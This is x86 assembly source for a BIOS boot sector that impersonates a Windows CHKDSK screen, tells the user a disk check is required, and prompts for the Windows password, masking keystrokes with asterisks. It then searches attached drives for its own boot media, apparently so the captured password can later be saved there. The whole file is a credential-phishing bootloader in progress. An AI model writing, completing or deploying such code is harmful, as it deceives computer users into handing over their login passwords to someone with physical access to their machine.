[BITS 16]
[ORG 0x7C00]
jmp start
db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk later

%macro biosprint 1 ; This macro lets us print a message without manually loading
mov si, %1
call puts
%endmacro

puts: ; print string - expects that strings are terminated by a 0, and that SI po
  mov al, [si]
  cmp BYTE al, 0
  je exit
  inc si
  call putc
  jmp puts
  exit:
   ret

putc: ; Print a char to screen
 mov ah, 0x0E
 mov bh, 0x00
 mov bl, 0x11
 int 0x10
 ret

sleep:
 ;mov eax, dword 0xffffffff
 mov eax, 200
 top:
  cmp eax, 5
  jbe end
  dec eax
  jmp top
  end:
   ret

find_disk:
 mov dh, 0x00 ; zeroeth head
 mov ah, 0x02 ; I want to read
 mov al, 0x01 ; I want to read one sector
 mov cx, 0x01 ; first sector, zero-eth track
 mov bx, 0x7E00
 int 13h
 jc nope
  mov al, [0x7E03]
  cmp al, 0x99
  jne nope
   biosprint ya
   jmp done_find_disk
 nope:
  biosprint no
 done_find_disk:
  ret

; Declarations
checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Enter your Windows password to continue: ', 0
rmchar db 8,' ',8,0
checking db 13,10,13,10, 'Cheking volume C:', 13,10,'This may take a few minutes.',0
ya db 'ok!',0
no db 'no!',0

start:
 mov ax, cs
 mov ds, ax    ; This is because DS has a stupid value when it starts, so we just
 xor ax, ax
 mov es, ax

 biosprint checkfs
 call sleep
 biosprint ntfs

readchar:
 mov ah, 00h
 int 0x16
 cmp al, 13
 je done_password
 cmp al, 8
 je backspace
 mov al, '*'
 call putc
 jmp loop
 backspace:
  biosprint rmchar
 loop:
  jmp readchar

done_password:
 biosprint checking

mov dl, 0x00
call find_disk
mov dl, 0x01
call find_disk
mov dl, 0x80
call find_disk
mov dl, 0x81
call find_disk

last:
 jmp $

times 510 - ($ - $$) db 0
dw 0xAA55
